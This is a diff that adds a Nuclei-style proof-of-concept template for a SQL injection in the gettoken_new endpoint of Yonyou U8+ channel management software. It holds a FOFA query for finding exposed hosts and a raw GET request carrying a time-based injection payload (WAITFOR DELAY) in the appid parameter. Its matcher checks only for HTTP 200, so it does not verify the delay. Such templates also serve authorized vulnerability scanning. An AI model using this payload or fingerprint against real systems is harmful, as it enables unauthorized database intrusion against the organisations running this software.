@@ -1,0 +1,19 @@
+id: poc-yyv1x0ozoxq0ex6g
+info:
+  name: 用友U8+渠道管理(高级版) gettoken_new 存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/yyv1x0ozoxq0ex6g'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: yyv1x0ozoxq0ex6g
+    fofa: '"common/images/dot.gif" && (icon_hash="737647198" || icon_hash="84729000")'
+http:
+- raw:
+  - GET /api/gettoken_new?appid=%27%3BWAITFOR+DELAY+%270%3A0%3A3%27--&appkey=1&appsecret=1&userid=1 HTTP/1.1
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
